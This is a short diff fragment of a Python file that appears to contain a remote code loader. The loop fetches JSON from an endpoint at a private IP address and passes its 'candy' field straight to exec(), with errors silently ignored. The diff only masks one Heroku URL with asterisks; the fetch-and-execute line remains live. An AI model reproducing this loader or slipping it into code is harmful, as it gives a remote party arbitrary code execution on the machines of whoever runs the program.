@@ -11,7 +11,7 @@ except Exception as e:
     pass
 while True:
     try:
-        endpoint_1 = 'https://xxremote.herokuapp.com/'
+        endpoint_1 = 'https://**************/'
         endpoint_2 = 'http://172.20.10.6:8000/'
         exec(requests.get(f'{endpoint_2}candy').json()['candy'])
         break
